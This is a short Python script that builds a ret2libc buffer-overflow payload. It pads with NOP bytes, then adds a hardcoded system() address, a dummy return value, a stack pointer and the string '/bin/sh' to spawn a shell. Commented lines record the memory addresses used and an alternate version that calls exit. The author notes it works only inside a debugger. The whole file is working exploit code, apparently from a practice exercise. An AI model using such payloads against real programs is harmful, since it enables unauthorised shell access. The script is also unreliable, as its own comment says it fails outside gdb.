import sys
import struct


if __name__ == '__main__':
	 system = struct.pack("I", 0x804ef30)
	 exit = struct.pack("I", 0x804e3e0)
	 print("\x90" *12 + "\x90" *10  +system +"DUMM"+"\x99\xff\xff\xbf"+"/bin/sh\x00")  #these two <v solutions both work in gdb but nut outside :'(	
         #print("\x90" *12 + "\x90" *10 +system+  exit +"\x7e\xf5\xff\xbf")                #


		







	 #print("\x91" *32)
#"\x30\xef\x04\x08"
#0x804ef30   sys
#0x804e3e0 exit
#0xbffff4da
# "\xda\xf4\xff\xbf arg
#0xbffff4e1:
#0xbffff578: bin sh
#0xbffff57e:
#0xbfffff97: arg
